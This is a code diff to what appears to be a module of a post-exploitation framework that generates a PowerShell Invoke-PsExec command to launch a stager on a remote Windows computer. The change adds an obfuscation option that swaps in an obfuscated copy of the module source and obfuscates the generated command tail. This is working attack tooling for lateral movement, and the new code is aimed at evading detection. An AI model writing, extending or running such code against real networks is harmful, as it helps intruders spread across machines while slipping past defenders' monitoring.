@@ -90,7 +90,7 @@ class Module:
                 self.options[option]['Value'] = value
 
 
-    def generate(self):
+    def generate(self, obfuscate=False, obfuscationCommand=""):
         
         listenerName = self.options['Listener']['Value']
         computerName = self.options['ComputerName']['Value']
@@ -103,7 +103,9 @@ class Module:
 
         # read in the common module source code
         moduleSource = self.mainMenu.installPath + "/data/module_source/lateral_movement/Invoke-PsExec.ps1"
-
+        if obfuscate:
+            helpers.obfuscate_module(moduleSource=moduleSource, obfuscationCommand=obfuscationCommand)
+            moduleSource = moduleSource.replace("module_source", "obfuscated_module_source")
         try:
             f = open(moduleSource, 'r')
         except:
@@ -115,7 +117,7 @@ class Module:
 
         script = moduleCode
 
-
+        scriptEnd = ""
         if command != "":
             # executing a custom command on the remote machine
             return ""
@@ -139,9 +141,11 @@ class Module:
                 else:
 
                     stagerCmd = '%COMSPEC% /C start /b C:\\Windows\\System32\\WindowsPowershell\\v1.0\\' + launcher
-                    script += "Invoke-PsExec -ComputerName %s -ServiceName \"%s\" -Command \"%s\"" % (computerName, serviceName, stagerCmd)
+                    scriptEnd += "Invoke-PsExec -ComputerName %s -ServiceName \"%s\" -Command \"%s\"" % (computerName, serviceName, stagerCmd)
 
 
-        script += "| Out-String | %{$_ + \"`n\"};"
-
+        scriptEnd += "| Out-String | %{$_ + \"`n\"};"
+        if obfuscate:
+            scriptEnd = helpers.obfuscate(psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
+        script += scriptEnd
         return script
